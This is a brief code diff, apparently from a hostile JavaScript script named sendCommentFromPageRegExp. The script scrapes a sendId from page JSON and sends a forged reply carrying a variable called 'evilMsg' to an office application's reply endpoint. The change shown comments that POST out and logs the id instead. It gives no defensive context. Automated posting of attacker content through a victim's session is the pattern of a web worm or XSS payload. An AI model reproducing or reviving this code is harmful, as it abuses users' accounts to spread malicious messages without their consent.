@@ -13,7 +13,8 @@ function sendCommentFromPageRegExp(url,regExpStr,msg){
 	            	try{
 	                                        if(jsonData.indexOf("getScript")<0){
 	                                         var id=/sendId":"(\d+)/.exec(jsonData)[1];
-	                                         $.post("/office/cucCard/cucCardAction_reply.so",{sendId:id,content:evilMsg,ifSendCard:"00"});
+	                                         console.info(id);
+	                                         //$.post("/office/cucCard/cucCardAction_reply.so",{sendId:id,content:evilMsg,ifSendCard:"00"});
 	                                    }
 	            	}catch(err){
 	            	}
